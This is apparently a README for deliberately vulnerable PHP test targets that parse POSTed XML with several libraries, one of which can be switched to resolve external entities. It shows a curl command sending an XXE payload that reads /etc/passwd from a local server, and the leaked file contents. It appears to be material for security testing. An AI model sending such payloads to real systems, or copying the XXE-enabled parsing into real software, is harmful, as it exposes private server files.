# PHP targets

## XML

Each script loads XML from the post body using a different PHP xml loading library.

* `xml.php`
* `xmlreader.php`
* `xmldom.php`
* `xmlsimple.php`

XXE can be enabled for `xmldom` and `xmlsimple` by setting the `xxe` query param to `true`.

```
$ curl -X POST http://127.0.0.1:9098/xmldom.php -d @files/owasp2.xml
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
----------------------------------------------------------------------------
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

```
$ curl -X POST http://127.0.0.1:9098/xmldom.php?xxe=true -d @files/owasp2.xml
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
----------------------------------------------------------------------------
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
</foo>
```
